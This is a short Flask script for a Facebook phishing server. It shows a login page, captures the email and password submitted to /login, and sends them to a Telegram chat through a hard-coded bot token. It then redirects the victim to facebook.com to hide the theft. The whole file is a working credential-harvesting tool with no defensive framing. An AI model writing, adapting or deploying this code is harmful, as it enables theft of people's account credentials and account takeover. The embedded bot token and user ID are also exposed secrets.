from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

# Configuration
BOT_TOKEN = "6061771552:AAGj36MRgNNmPPDmoQbQeAdYZSVIa6HFj6s"
USER_ID = "5066083483"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Load HTML from file or embed it directly
with open('index.html', 'r') as f:
    HTML_CONTENT = f.read()

@app.route('/')
def home():
    return render_template_string(HTML_CONTENT)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    if email and password:
        message = f"🔓 *New Facebook Credentials Captured*\n\n📧 Email: `{email}`\n🔑 Password: `{password}`"
        
        # Send to Telegram
        payload = {
            "chat_id": USER_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        try:
            requests.post(TELEGRAM_API_URL, json=payload)
            return "<h1>Logging in...</h1><meta http-equiv='refresh' content='5;url=https://www.facebook.com'>"
        except Exception as e:
            return f"Error sending to Telegram: {e}"
    return "Please enter credentials."

if __name__ == '__main__':
    # Run the server
    app.run(host='0.0.0.0', port=5000)
